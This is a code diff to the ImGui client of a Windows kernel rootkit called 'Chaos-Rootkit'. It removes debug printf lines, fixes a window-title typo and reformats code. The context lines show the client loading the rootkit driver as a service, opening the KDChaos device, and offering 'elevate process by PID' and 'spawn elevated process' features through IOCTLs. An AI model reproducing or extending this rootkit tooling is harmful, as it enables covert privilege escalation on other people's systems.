@@ -108,7 +108,6 @@ BOOL loadDriver(char* driverPath) {
     hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
     if (hSCM == NULL)
     {
-        printf("cant open SC Manager\n");
         return (1);
     }
     const char* g_serviceName = "Chaos-Rootkit";
@@ -291,10 +290,7 @@ int main(int, char**)
 
                 if (loadDriver(FullDriverPath)) {
                     is_rootket_connected = 0;
-                    printf("Rootkit Not loaded\n");
                 }
-
-                printf(" connected\n");
 
                 hdevice = CreateFile(L"\\\\.\\KDChaos", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
 
@@ -346,6 +342,7 @@ int main(int, char**)
 
         if (elev_specific_process)
         {
+            component_color_handler = 0;
             ImGui::Begin("Another Window", &elev_specific_process);ImGui::Text("Enter PID");
 
             ImGui::SameLine();
@@ -374,7 +371,9 @@ int main(int, char**)
             }
             if (component_color_handler == 2)
             {
-                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 1.0f, 0.0f, 1.0f));ImGui::Text("IOCTL sent, Process now is elevated");
+                ImGui::PushStyleColor(ImGuiCol_Text, ImVec4(0.0f, 1.0f, 0.0f, 1.0f));
+                
+                ImGui::Text("IOCTL sent, Process now is elevated");
 
             }
 
@@ -464,7 +463,7 @@ int main(int, char**)
         if (spawn_elevated_process)
         {
 
-            ImGui::Begin("spawA elevated_process", &spawn_elevated_process);   
+            ImGui::Begin("spawn elevated_process", &spawn_elevated_process);   
 
             if (ImGui::Button("spawn_elevated_process"))
             {
@@ -513,7 +512,7 @@ int main(int, char**)
                 ImGui::PopStyleColor(); 
             ImGui::End();
         }
-                ImGui::Render();
+        ImGui::Render();
         int display_w, display_h;
         glfwGetFramebufferSize(window, &display_w, &display_h);
         glViewport(0, 0, display_w, display_h);
